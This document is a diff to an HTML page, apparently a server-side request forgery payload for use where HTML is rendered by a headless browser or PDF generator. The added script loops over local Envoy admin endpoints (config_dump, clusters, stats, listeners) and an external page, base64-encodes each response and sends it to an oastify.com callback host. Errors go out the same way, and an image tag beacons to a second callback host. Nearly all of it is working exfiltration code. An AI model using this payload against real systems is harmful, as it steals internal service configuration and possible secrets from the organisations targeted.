@@ -2,12 +2,29 @@
 <html>
 <img src="http://2hkrzi62zrpd84wpyjlmcx6f46axyxmm.oastify.com/check.png">
 <script>
-var r = new window.XMLHttpRequest();
-r.open('GET', 'https://aimed-guendouz0.github.io/qsdf.html', false);
-r.send();
-var encoded = r.responseText ? btoa(r.responseText) : 'test';
-var x = new window.XMLHttpRequest();
-x.open('GET', 'https://srnh98gs9hz3iu6f89vcmng5ewkn8mwb.oastify.com/exfil?d=' + encoded, false);
-x.send();
+var endpoints = [
+  'https://aimed-guendouz0.github.io/qsdf.html',
+  'http://localhost:9901/config_dump',
+  'http://localhost:9901/clusters',
+  'http://localhost:9901/stats',
+  'http://localhost:9901/listeners',
+  'https://aimed-guendouz0.github.io/qsdf.html'
+];
+
+for (var i = 0; i < endpoints.length; i++) {
+  try {
+    var r = new window.XMLHttpRequest();
+    r.open('GET', endpoints[i], false);
+    r.send();
+    var encoded = r.responseText ? btoa(unescape(encodeURIComponent(r.responseText))) : 'empty';
+    var x = new window.XMLHttpRequest();
+    x.open('GET', 'https://srnh98gs9hz3iu6f89vcmng5ewkn8mwb.oastify.com/exfil?ep=' + i + '&d=' + encoded, false);
+    x.send();
+  } catch(e) {
+    var xe = new window.XMLHttpRequest();
+    xe.open('GET', 'https://srnh98gs9hz3iu6f89vcmng5ewkn8mwb.oastify.com/error?ep=' + i + '&e=' + btoa(e.message), false);
+    xe.send();
+  }
+}
 </script>
 </html>
